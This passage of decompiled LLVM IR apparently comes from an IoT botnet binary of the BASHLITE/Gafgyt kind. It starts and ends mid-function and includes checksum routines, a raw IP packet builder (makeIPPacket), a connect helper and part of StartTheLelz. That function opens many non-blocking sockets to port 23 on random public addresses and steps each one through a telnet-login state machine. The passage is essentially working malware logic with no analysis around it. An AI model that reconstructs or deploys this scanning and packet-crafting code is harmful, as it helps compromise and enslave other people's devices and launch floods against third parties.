  %v3_dc4445 = phi i32 [ %v3_dc44, %dec_label_pc_dbdc ], [ %v3_dc4440, %dec_label_pc_dc2c.preheader ]
  %v2_dc3c44 = phi i32 [ %v2_dc3c, %dec_label_pc_dbdc ], [ %v2_dc3c39, %dec_label_pc_dc2c.preheader ]
  %v3_dc5843 = phi i32 [ %v2_dc1c, %dec_label_pc_dbdc ], [ %v3_dc58.ph, %dec_label_pc_dc2c.preheader ]
  %v2_dbf0 = urem i32 %v3_dc5843, 65536
  %v2_dc1c = add i32 %v2_dc3c44, %v2_dbf0
  %v3_dc1c = icmp ult i32 %v2_dc1c, %v2_dbf0
  %v4_dc20 = zext i1 %v3_dc1c to i32
  %v5_dc20 = add nuw nsw i32 %v4_dc20, %v3_dc4445
  %v3_dc30 = mul i32 %v5_dc20, 65536
  %v3_dc38 = udiv i32 %v2_dc1c, 65536
  %v2_dc3c = or i32 %v3_dc30, %v3_dc38
  %v3_dc44 = udiv i32 %v5_dc20, 65536
  %v2_dc4c = or i32 %v2_dc3c, %v3_dc44
  %v2_dc50 = icmp eq i32 %v2_dc4c, 0
  br i1 %v2_dc50, label %dec_label_pc_dc2c.dec_label_pc_dc58_crit_edge, label %dec_label_pc_dbdc

dec_label_pc_dc2c.dec_label_pc_dc58_crit_edge:    ; preds = %dec_label_pc_dbdc
  br label %dec_label_pc_dc58

dec_label_pc_dc58:                                ; preds = %dec_label_pc_dc2c.dec_label_pc_dc58_crit_edge, %dec_label_pc_dc2c.preheader
  %v3_dc58.lcssa = phi i32 [ %v2_dc1c, %dec_label_pc_dc2c.dec_label_pc_dc58_crit_edge ], [ %v3_dc58.ph, %dec_label_pc_dc2c.preheader ]
  %v1_dc64 = urem i32 %v3_dc58.lcssa, 65536
  %v3_dc6c = xor i32 %v1_dc64, 65535
  ret i32 %v3_dc6c

; uselistorder directives
  uselistorder i32 %v2_dc3c, { 1, 0 }
  uselistorder i32 %v5_dc20, { 1, 0 }
  uselistorder i32 %v2_dc1c, { 2, 0, 3, 1 }
  uselistorder i32 %v3_dc4440, { 1, 0 }
  uselistorder i32 %stack_var_-44.1.ph, { 1, 0 }
  uselistorder i32 %v3_dc58.ph, { 2, 1, 0 }
  uselistorder i32 %v2_dbc4, { 0, 2, 1 }
  uselistorder i32 %v1_db90, { 0, 2, 1 }
  uselistorder i32 %v2_db70, { 0, 2, 1 }
  uselistorder i32 %v2_db6c, { 1, 0 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_dbdc, { 1, 0 }
  uselistorder label %dec_label_pc_db58, { 1, 0 }
}

define i32 @tcpcsum(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_dc84 = load i32, i32* @fp, align 4
  store i32 56460, i32* %stack_var_-4, align 4
  %v2_dc88 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_dc88, i32* @fp, align 4
  store i32 %arg2, i32* %stack_var_-56, align 4
  %v1_dca8 = add i32 %arg1, 12
  %v2_dca8 = inttoptr i32 %v1_dca8 to i32*
  %v3_dca8 = load i32, i32* %v2_dca8, align 4
  store i32 %v3_dca8, i32* %stack_var_-44, align 4
  %v1_dcd0 = call i32 @__GI_htons(i32 20)
  %v1_dcec = call i32 @malloc(i32 32)
  %v2_dcf8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_dcf8, i32* @r3, align 4
  store i32 %v1_dcec, i32* @r0, align 4
  store i32 %v2_dcf8, i32* @r1, align 4
  store i32 12, i32* @r2, align 4
  %v0_dd08 = call i32 @memcpy()
  %v1_dd10 = add i32 %v1_dcec, 12
  store i32 %v1_dd10, i32* @r3, align 4
  store i32 %v1_dd10, i32* @r0, align 4
  %v3_dd18 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_dd18, i32* @r1, align 4
  store i32 20, i32* @r2, align 4
  %v0_dd20 = call i32 @memcpy()
  %v2_dd2c = inttoptr i32 %v1_dcec to i16*
  %v3_dd2c = call i32 @csum(i16* %v2_dd2c, i32 32)
  %sext = mul i32 %v3_dd2c, 65536
  %v1_dd30 = sdiv i32 %sext, 65536
  store i32 %v1_dcec, i32* @r0, align 4
  %v0_dd3c = call i32 @free()
  %v4_dd40 = urem i32 %v1_dd30, 65536
  store i32 %v3_dc84, i32* @fp, align 4
  ret i32 %v4_dd40

; uselistorder directives
  uselistorder i32 %v1_dcec, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
}

define i32 @makeIPPacket(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg4 to i8
  %tmp3 = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  %v3_dd58 = load i32, i32* @fp, align 4
  store i8 69, i8* %arg1, align 1
  %v3_ddc4 = add i32 %tmp3, 1
  %v4_ddc4 = inttoptr i32 %v3_ddc4 to i8*
  store i8 0, i8* %v4_ddc4, align 1
  %v3_ddc8 = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_ddc8, 20
  %v1_dde4 = trunc i32 %fold to i16
  %v3_dde4 = add i32 %tmp3, 2
  %v4_dde4 = inttoptr i32 %v3_dde4 to i16*
  store i16 %v1_dde4, i16* %v4_dde4, align 2
  %v0_dde8 = call i32 @rand_cmwc()
  %v1_ddfc = trunc i32 %v0_dde8 to i16
  %v3_ddfc = add i32 %tmp3, 4
  %v4_ddfc = inttoptr i32 %v3_ddfc to i16*
  store i16 %v1_ddfc, i16* %v4_ddfc, align 2
  %v3_de08 = add i32 %tmp3, 6
  %v4_de08 = inttoptr i32 %v3_de08 to i16*
  store i16 0, i16* %v4_de08, align 2
  %v3_de14 = add i32 %tmp3, 8
  %v4_de14 = inttoptr i32 %v3_de14 to i8*
  store i8 -1, i8* %v4_de14, align 1
  %v3_de20 = add i32 %tmp3, 9
  %v4_de20 = inttoptr i32 %v3_de20 to i8*
  store i8 %tmp, i8* %v4_de20, align 1
  %v3_de2c = add i32 %tmp3, 10
  %v4_de2c = inttoptr i32 %v3_de2c to i16*
  store i16 0, i16* %v4_de2c, align 2
  %v2_de38 = add i32 %tmp3, 12
  %v3_de38 = inttoptr i32 %v2_de38 to i32*
  store i32 %arg3, i32* %v3_de38, align 4
  %v2_de44 = add i32 %tmp3, 16
  %v3_de44 = inttoptr i32 %v2_de44 to i32*
  store i32 %arg2, i32* %v3_de44, align 4
  store i32 %v3_dd58, i32* @fp, align 4
  ret i32 %v0_dde8

; uselistorder directives
  uselistorder i8 -1, { 1, 2, 3, 0, 4 }
}

define i32 @sclose(i32 %arg1) local_unnamed_addr {
entry:
  %v8_de70 = icmp sgt i32 %arg1, 2
  br i1 %v8_de70, label %dec_label_pc_de80, label %dec_label_pc_de90

dec_label_pc_de80:                                ; preds = %entry
  %v1_de84 = call i32 @__GI_close(i32 %arg1)
  br label %dec_label_pc_de90

dec_label_pc_de90:                                ; preds = %entry, %dec_label_pc_de80
  %storemerge1 = phi i32 [ 0, %dec_label_pc_de80 ], [ 1, %entry ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder label %dec_label_pc_de90, { 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i16 %arg2) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_dea8 = load i32, i32* @fp, align 4
  store i32 57008, i32* %stack_var_-4, align 4
  %v2_deac = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_deac, i32* @fp, align 4
  store i32 1, i32* %stack_var_-44, align 4
  store i32 %arg1, i32* @r0, align 4
  %v1_decc = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_dedc = icmp eq i32 %v1_decc, 0
  br i1 %v2_dedc, label %dec_label_pc_dee4, label %dec_label_pc_def0

dec_label_pc_dee4:                                ; preds = %entry
  br label %dec_label_pc_dfbc

dec_label_pc_def0:                                ; preds = %entry
  %tmp = sext i16 %arg2 to i32
  %v1_def4 = add i32 %v1_decc, 16
  %v2_def4 = inttoptr i32 %v1_def4 to i32*
  %v3_def4 = load i32, i32* %v2_def4, align 4
  %v1_def8 = inttoptr i32 %v3_def4 to i32*
  %v2_def8 = load i32, i32* %v1_def8, align 4
  %v1_df00 = add i32 %v1_decc, 12
  %v2_df00 = inttoptr i32 %v1_df00 to i32*
  %v3_df00 = load i32, i32* %v2_df00, align 4
  store i32 %v3_df00, i32* @r2, align 4
  %v2_df0c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_df0c, i32* @r3, align 4
  %v5_df18 = call i32 @bcopy(i32 %v2_def8, i32 %v2_df0c, i32 %v3_df00, i32 %v2_df0c, i32 %v1_decc)
  %v2_df24 = call i32 @__GI_htons(i32 %tmp)
  store i32 2, i32* %stack_var_-40, align 4
  %v3_df44 = call i32 @socket(i32 2, i32 1, i32 6)
  %v2_df50 = ptrtoint i32* %stack_var_-44 to i32
  %v5_df6c = call i32 @__GI_setsockopt(i32 %v3_df44, i32 6, i32 1, i32 %v2_df50, i32 4)
  %v3_df74 = icmp eq i32 %v3_df44, -1
  br i1 %v3_df74, label %dec_label_pc_df7c, label %dec_label_pc_df88

dec_label_pc_df7c:                                ; preds = %dec_label_pc_def0
  br label %dec_label_pc_dfbc

dec_label_pc_df88:                                ; preds = %dec_label_pc_def0
  %v2_df08 = ptrtoint i32* %stack_var_-40 to i32
  %v3_df98 = call i32 @__libc_connect(i32 %v3_df44, i32 %v2_df08, i32 16)
  %v3_dfa0 = icmp eq i32 %v3_df98, -1
  br i1 %v3_dfa0, label %dec_label_pc_dfa8, label %dec_label_pc_dfb4

dec_label_pc_dfa8:                                ; preds = %dec_label_pc_df88
  br label %dec_label_pc_dfbc

dec_label_pc_dfb4:                                ; preds = %dec_label_pc_df88
  br label %dec_label_pc_dfbc

dec_label_pc_dfbc:                                ; preds = %dec_label_pc_dfa8, %dec_label_pc_df7c, %dec_label_pc_dee4, %dec_label_pc_dfb4
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_dee4 ], [ 0, %dec_label_pc_df7c ], [ 0, %dec_label_pc_dfa8 ], [ %v3_df44, %dec_label_pc_dfb4 ]
  store i32 %v3_dea8, i32* @fp, align 4
  ret i32 %stack_var_-60.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder label %dec_label_pc_dfbc, { 3, 0, 1, 2 }
}

define i32 @StartTheLelz(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-324 = alloca i32, align 4
  %stack_var_-604 = alloca i32, align 4
  %stack_var_-612 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_dfd0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_dfd0, i32* %ip.global-to-local, align 4
  %v3_dfd4 = load i32, i32* @r4, align 4
  store i32 %v3_dfd4, i32* %stack_var_-24, align 4
  store i32 57308, i32* %stack_var_-4, align 4
  %v19_dfd4 = ptrtoint i32* %stack_var_-24 to i32
  %v2_dfd8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_dfd8, i32* @fp, align 4
  %v2_dff4 = call i32 @__GI_time(i32* null)
  store i32 %v2_dff4, i32* @r4, align 4
  %v0_e000 = call i32 @rand_cmwc()
  %v0_e008 = load i32, i32* @r4, align 4
  %v2_e008 = xor i32 %v0_e008, %v0_e000
  %v1_e010 = call i32 @srand(i32 %v2_e008)
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-612, align 4
  %v1_e02c = call i32 @__GI_htons(i32 23)
  store i32 8, i32* @r2, align 4
  %v2_e05c = bitcast i32* %stack_var_-604 to i8*
  %v3_e05c = call i32 @__GI_memset(i8* %v2_e05c, i32 0)
  %v1_e068 = call i32 @malloc(i32 513)
  store i32 513, i32* @r2, align 4
  %v2_e084 = inttoptr i32 %v1_e068 to i8*
  %v3_e084 = call i32 @__GI_memset(i8* %v2_e084, i32 0)
  %v2_e094 = mul i32 %arg2, 28
  %v1_e09c = add i32 %v2_e094, 14
  %v3_e0a0 = and i32 %v1_e09c, -8
  %v1_e0a8 = load i32, i32* @sp, align 4
  %v2_e0a8 = sub i32 %v1_e0a8, %v3_e0a0
  %v1_e0b8 = add i32 %v2_e0a8, 15
  %v3_e0bc = and i32 %v1_e0b8, -8
  %v2_e0e0 = mul i32 %arg2, 5
  store i32 %v2_e0e0, i32* @r2, align 4
  %v2_e0f0 = inttoptr i32 %v3_e0bc to i8*
  %v3_e0f0 = call i32 @__GI_memset(i8* %v2_e0f0, i32 0)
  store i32 0, i32* %r2.global-to-local, align 4
  %v5_e19056 = icmp sgt i32 %arg2, 0
  br i1 %v5_e19056, label %dec_label_pc_e100, label %dec_label_pc_e194

dec_label_pc_e100:                                ; preds = %entry, %dec_label_pc_e100
  %storemerge457 = phi i32 [ %v1_e17c, %dec_label_pc_e100 ], [ 0, %entry ]
  %v2_e110 = mul i32 %storemerge457, 28
  %v2_e114 = add i32 %v2_e110, %v3_e0bc
  store i32 28, i32* @r2, align 4
  %v2_e124 = inttoptr i32 %v2_e114 to i8*
  %v3_e124 = call i32 @__GI_memset(i8* %v2_e124, i32 0)
  %v3_e14c = add i32 %v2_e114, 9
  %v4_e14c = inttoptr i32 %v3_e14c to i8*
  store i8 1, i8* %v4_e14c, align 1
  %v2_e16c = add i32 %v2_e114, 24
  %v2_e174 = inttoptr i32 %v2_e16c to i32*
  store i32 %v1_e068, i32* %v2_e174, align 4
  %v1_e17c = add nuw nsw i32 %storemerge457, 1
  store i32 %v1_e17c, i32* %r2.global-to-local, align 4
  %v5_e190 = icmp slt i32 %v1_e17c, %arg2
  br i1 %v5_e190, label %dec_label_pc_e100, label %dec_label_pc_e194

dec_label_pc_e194:                                ; preds = %dec_label_pc_e100, %entry
  br label %dec_label_pc_e19c

dec_label_pc_e19c:                                ; preds = %dec_label_pc_e19c, %dec_label_pc_e194
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_e194 ], [ %v1_e1a0, %dec_label_pc_e19c ]
  %v1_e1a0 = add i32 %stack_var_-56.0, 1
  store i32 %v1_e1a0, i32* %r2.global-to-local, align 4
  %v4_e1b0 = mul i32 %v1_e1a0, 4
  %v5_e1b0 = add i32 %v4_e1b0, ptrtoint ([10 x i8*]* @global_var_2a20c.495 to i32)
  %v6_e1b0 = inttoptr i32 %v5_e1b0 to i32*
  %v7_e1b0 = load i32, i32* %v6_e1b0, align 4
  %v2_e1b4 = icmp eq i32 %v7_e1b0, 0
  br i1 %v2_e1b4, label %dec_label_pc_e1bc.preheader, label %dec_label_pc_e19c

dec_label_pc_e1bc.preheader:                      ; preds = %dec_label_pc_e19c
  %v2_e244 = add i32 %v3_e0bc, 8
  %v2_e544 = or i32 %v3_e0bc, 4
  %v2_e624 = ptrtoint i32* %stack_var_-612 to i32
  %v2_e6a4 = ptrtoint i32* %stack_var_-324 to i32
  %v2_e7a0 = ptrtoint i32* %stack_var_-332 to i32
  %v2_e7fc = ptrtoint i32* %stack_var_-340 to i32
  %v2_e800 = ptrtoint i32* %stack_var_-336 to i32
  %v2_e91c = add i32 %v3_e0bc, 16
  %v2_e998 = add i32 %v3_e0bc, 24
  br label %dec_label_pc_e1bc

dec_label_pc_e1bc:                                ; preds = %dec_label_pc_e1bc, %dec_label_pc_f318, %dec_label_pc_e1bc.preheader
  store i32 0, i32* %r2.global-to-local, align 4
  br i1 %v5_e19056, label %dec_label_pc_e1c8, label %dec_label_pc_e1bc

dec_label_pc_e1c8:                                ; preds = %dec_label_pc_e1bc, %dec_label_pc_f318
  %storemerge548 = phi i32 [ %v1_f31c, %dec_label_pc_f318 ], [ 0, %dec_label_pc_e1bc ]
  %v3_e1d4 = mul i32 %storemerge548, 4
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v2_e1dc = mul i32 %storemerge548, 28
  %v2_e1e0 = add i32 %v2_e1dc, %v3_e0bc
  %v2_e1e4 = add i32 %v2_e1e0, 16
  %v1_e1e8 = inttoptr i32 %v2_e1e4 to i32*
  %v2_e1e8 = load i32, i32* %v1_e1e8, align 4
  %v2_e1ec = icmp eq i32 %v2_e1e8, 0
  br i1 %v2_e1ec, label %dec_label_pc_e1f4, label %dec_label_pc_e22c

dec_label_pc_e1f4:                                ; preds = %dec_label_pc_e1c8
  store i32 %storemerge548, i32* @r4, align 4
  %v2_e1fc = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_e210 = load i32, i32* @r4, align 4
  %v3_e214 = mul i32 %v0_e210, 4
  store i32 %v3_e214, i32* %r2.global-to-local, align 4
  %v2_e21c = mul i32 %v0_e210, 28
  %v2_e224 = add i32 %v2_e91c, %v2_e21c
  %v2_e228 = inttoptr i32 %v2_e224 to i32*
  store i32 %v2_e1fc, i32* %v2_e228, align 4
  br label %dec_label_pc_e22c

dec_label_pc_e22c:                                ; preds = %dec_label_pc_e1c8, %dec_label_pc_e1f4
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v2_e248 = add i32 %v2_e244, %v2_e1dc
  %v1_e24c = inttoptr i32 %v2_e248 to i8*
  %v2_e24c = load i8, i8* %v1_e24c, align 4
  %v3_e24c = sext i8 %v2_e24c to i32
  switch i32 %v3_e24c, label %dec_label_pc_f318 [
    i32 0, label %dec_label_pc_e27c
    i32 1, label %dec_label_pc_e6b8.lr.ph
    i32 2, label %dec_label_pc_e964
    i32 3, label %dec_label_pc_eab0
    i32 4, label %dec_label_pc_ec04
    i32 5, label %dec_label_pc_ed50
    i32 6, label %dec_label_pc_eea4
    i32 7, label %dec_label_pc_f1a8
  ]

dec_label_pc_e27c:                                ; preds = %dec_label_pc_e22c
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v2_e298 = add i32 %v2_e1e0, 8
  %v1_e29c = add i32 %v2_e1e0, 9
  %v2_e29c = inttoptr i32 %v1_e29c to i8*
  %v3_e29c = load i8, i8* %v2_e29c, align 1
  %v7_e2a0 = icmp eq i8 %v3_e29c, 1
  br i1 %v7_e2a0, label %dec_label_pc_e2a8, label %dec_label_pc_e354

dec_label_pc_e2a8:                                ; preds = %dec_label_pc_e27c
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v2_e2c4 = add i32 %v2_e1e0, 24
  %v1_e2c8 = inttoptr i32 %v2_e2c4 to i32*
  %v2_e2c8 = load i32, i32* %v1_e2c8, align 4
  store i32 28, i32* @r2, align 4
  %v2_e2f4 = inttoptr i32 %v2_e1e0 to i8*
  %v3_e2f4 = call i32 @__GI_memset(i8* %v2_e2f4, i32 0)
  store i32 %v2_e2c4, i32* %r2.global-to-local, align 4
  store i32 %v2_e2c8, i32* %v1_e2c8, align 4
  store i32 %storemerge548, i32* @r4, align 4
  %v4_e324 = call i32 @GetRandomPublicIP(i32 24, i32 %v3_e0bc, i32 %v2_e2c4, i32 %v2_e2c8)
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_e334 = load i32, i32* @r4, align 4
  %v3_e338 = mul i32 %v0_e334, 4
  store i32 %v3_e338, i32* %r2.global-to-local, align 4
  %v2_e340 = mul i32 %v0_e334, 28
  %v2_e348 = add i32 %v2_e544, %v2_e340
  %v2_e34c = inttoptr i32 %v2_e348 to i32*
  store i32 %v4_e324, i32* %v2_e34c, align 4
  br label %dec_label_pc_e4e0

dec_label_pc_e354:                                ; preds = %dec_label_pc_e27c
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v3_e374 = load i8, i8* %v2_e29c, align 1
  %v2_e378 = icmp eq i8 %v3_e374, 0
  br i1 %v2_e378, label %dec_label_pc_e380, label %dec_label_pc_e4e0

dec_label_pc_e380:                                ; preds = %dec_label_pc_e354
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v1_e3a4 = add i32 %v2_e1e0, 11
  %v2_e3a4 = inttoptr i32 %v1_e3a4 to i8*
  %v3_e3a4 = load i8, i8* %v2_e3a4, align 1
  %v1_e3a8 = add i8 %v3_e3a4, 1
  store i8 %v1_e3a8, i8* %v2_e3a4, align 1
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v1_e3fc = add i32 %v2_e1e0, 10
  %v2_e3fc = inttoptr i32 %v1_e3fc to i8*
  %v3_e3fc = load i8, i8* %v2_e3fc, align 2
  %v1_e400 = add i8 %v3_e3fc, 1
  store i32 %v3_e0bc, i32* %ip.global-to-local, align 4
  store i32 8, i32* @lr, align 4
  store i8 %v1_e400, i8* %v2_e3fc, align 2
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v3_e450 = load i8, i8* %v2_e3a4, align 1
  %v7_e454 = icmp eq i8 %v3_e450, 3
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  br i1 %v7_e454, label %dec_label_pc_e45c, label %dec_label_pc_e488

dec_label_pc_e45c:                                ; preds = %dec_label_pc_e380
  store i32 %v2_e298, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v2_e29c, align 1
  br label %dec_label_pc_f318

dec_label_pc_e488:                                ; preds = %dec_label_pc_e380
  %v3_e4a8 = load i8, i8* %v2_e3fc, align 2
  %v7_e4ac = icmp eq i8 %v3_e4a8, 3
  br i1 %v7_e4ac, label %dec_label_pc_e4b4, label %dec_label_pc_e4e0

dec_label_pc_e4b4:                                ; preds = %dec_label_pc_e488
  store i32 %v2_e298, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v2_e29c, align 1
  br label %dec_label_pc_f318

dec_label_pc_e4e0:                                ; preds = %dec_label_pc_e488, %dec_label_pc_e354, %dec_label_pc_e2a8
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-612, align 4
  %v1_e4f8 = call i32 @__GI_htons(i32 23)
  store i32 8, i32* @r2, align 4
  %v3_e528 = call i32 @__GI_memset(i8* %v2_e05c, i32 0)
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  store i32 %storemerge548, i32* @r4, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_e564 = call i32 @socket(i32 2, i32 1, i32 0)
  %v0_e56c = load i32, i32* @r4, align 4
  %v2_e578 = mul i32 %v0_e56c, 28
  %v2_e57c = add i32 %v2_e578, %v3_e0bc
  %v2_e580 = inttoptr i32 %v2_e57c to i32*
  store i32 %v3_e564, i32* %v2_e580, align 4
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v1_e59c = inttoptr i32 %v2_e1e0 to i32*
  %v2_e59c = load i32, i32* %v1_e59c, align 4
  %v7_e5a0 = icmp eq i32 %v2_e59c, -1
  br i1 %v7_e5a0, label %dec_label_pc_f318, label %dec_label_pc_e5a8

dec_label_pc_e5a8:                                ; preds = %dec_label_pc_e4e0
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v2_e5c0 = load i32, i32* %v1_e59c, align 4
  store i32 %v2_e5c0, i32* @r4, align 4
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v2_e5dc = load i32, i32* %v1_e59c, align 4
  store i32 %v2_e5dc, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_e5ec = call i32 @__libc_fcntl(i32 %v2_e5dc, i32 3)
  %v1_e5f4 = or i32 %v2_e5ec, 2048
  store i32 %v1_e5f4, i32* @r3, align 4
  %v0_e5f8 = load i32, i32* @r4, align 4
  store i32 %v1_e5f4, i32* %r2.global-to-local, align 4
  %v2_e604 = call i32 @__libc_fcntl(i32 %v0_e5f8, i32 4)
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v2_e620 = load i32, i32* %v1_e59c, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_e634 = call i32 @__libc_connect(i32 %v2_e620, i32 %v2_e624, i32 16)
  %v3_e63c = icmp eq i32 %v3_e634, -1
  br i1 %v3_e63c, label %dec_label_pc_e644, label %dec_label_pc_e67c

dec_label_pc_e644:                                ; preds = %dec_label_pc_e5a8
  %v0_e644 = call i32 @__GI___errno_location()
  %v1_e64c = inttoptr i32 %v0_e644 to i32*
  %v2_e64c = load i32, i32* %v1_e64c, align 4
  %v7_e650 = icmp eq i32 %v2_e64c, 115
  br i1 %v7_e650, label %dec_label_pc_e67c, label %dec_label_pc_e658

dec_label_pc_e658:                                ; preds = %dec_label_pc_e644
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v3_e674 = call i32 @reset_telstate(i32 %v2_e1e0, i32 %v3_e0bc, i32 %v3_e1d4)
  br label %dec_label_pc_f318

dec_label_pc_e67c:                                ; preds = %dec_label_pc_e5a8, %dec_label_pc_e644
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v3_e69c = call i32 @advance_state(i32* nonnull %v1_e59c, i32 1)
  br label %dec_label_pc_f318

dec_label_pc_e6b8.lr.ph:                          ; preds = %dec_label_pc_e22c
  br label %dec_label_pc_e6b8

dec_label_pc_e6b8:                                ; preds = %dec_label_pc_e6b8.lr.ph, %dec_label_pc_e6b8
  %storemerge610 = phi i32 [ 0, %dec_label_pc_e6b8.lr.ph ], [ %v1_e6cc, %dec_label_pc_e6b8 ]
  store i32 %v2_e6a4, i32* %r2.global-to-local, align 4
  %v5_e6c4 = mul nuw nsw i32 %storemerge610, 4
  %v6_e6c4 = add i32 %v5_e6c4, %v2_e6a4
  %v7_e6c4 = inttoptr i32 %v6_e6c4 to i32*
  store i32 0, i32* %v7_e6c4, align 4
  %v1_e6cc = add nuw nsw i32 %storemerge610, 1
  %tmp39 = icmp ult i32 %v1_e6cc, 32
  br i1 %tmp39, label %dec_label_pc_e6b8, label %dec_label_pc_e6e0

dec_label_pc_e6e0:                                ; preds = %dec_label_pc_e6b8
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v1_e6f8 = inttoptr i32 %v2_e1e0 to i32*
  %v2_e6f8 = load i32, i32* %v1_e6f8, align 4
  %v3_e6fc = udiv i32 %v2_e6f8, 32
  %v3_e710 = mul nuw nsw i32 %v3_e6fc, 4
  %v2_e718 = add i32 %v3_e710, %v19_dfd4
  store i32 %v2_e718, i32* %r2.global-to-local, align 4
  %v2_e71c = add i32 %v2_e718, -300
  %v1_e720 = inttoptr i32 %v2_e71c to i32*
  %v2_e720 = load i32, i32* %v1_e720, align 4
  store i32 %v2_e720, i32* %ip.global-to-local, align 4
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v2_e73c = load i32, i32* %v1_e6f8, align 4
  %v1_e740 = urem i32 %v2_e73c, 32
  %v6_e748 = shl i32 1, %v1_e740
  %v2_e74c = or i32 %v6_e748, %v2_e720
  store i32 %v2_e74c, i32* %v1_e720, align 4
  store i32 0, i32* %stack_var_-332, align 4
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v2_e794 = load i32, i32* %v1_e6f8, align 4
  %v1_e798 = add i32 %v2_e794, 1
  store i32 %v1_e798, i32* %r2.global-to-local, align 4
  store i32 %v2_e6a4, i32* %ip.global-to-local, align 4
  %v1_e7a4 = load i32, i32* @sp, align 4
  %v2_e7a4 = inttoptr i32 %v1_e7a4 to i32*
  store i32 %v2_e7a0, i32* %v2_e7a4, align 4
  %v0_e7a8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_e6a4, i32* %r2.global-to-local, align 4
  %v4_e7b8 = load i32, i32* %stack_var_-332, align 4
  %v5_e7b8 = call i32 @__libc_select(i32 %v0_e7a8, i32 0, i32 %v2_e6a4, i32 0, i32 %v4_e7b8)
  %v7_e7c8 = icmp eq i32 %v5_e7b8, 1
  br i1 %v7_e7c8, label %dec_label_pc_e7d0, label %dec_label_pc_e8d4

dec_label_pc_e7d0:                                ; preds = %dec_label_pc_e6e0
  store i32 4, i32* %stack_var_-336, align 4
  store i32 0, i32* %stack_var_-340, align 4
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v2_e7f8 = load i32, i32* %v1_e6f8, align 4
  store i32 %v2_e7f8, i32* %r2.global-to-local, align 4
  store i32 %v2_e7fc, i32* %ip.global-to-local, align 4
  %v1_e804 = load i32, i32* @sp, align 4
  %v2_e804 = inttoptr i32 %v1_e804 to i32*
  store i32 %v2_e800, i32* %v2_e804, align 4
  %v0_e808 = load i32, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_e818 = load i32, i32* %stack_var_-340, align 4
  %v5_e818 = call i32 @getsockopt(i32 %v0_e808, i32 1, i32 4, i32 %v2_e7fc, i32 %v4_e818)
  %v3_e81c = load i32, i32* %stack_var_-340, align 4
  %v2_e820 = icmp eq i32 %v3_e81c, 0
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  br i1 %v2_e820, label %dec_label_pc_e84c, label %dec_label_pc_e828

dec_label_pc_e828:                                ; preds = %dec_label_pc_e7d0
  %v3_e844 = call i32 @reset_telstate(i32 %v2_e1e0, i32 %v3_e0bc, i32 %v3_e1d4)
  br label %dec_label_pc_f318

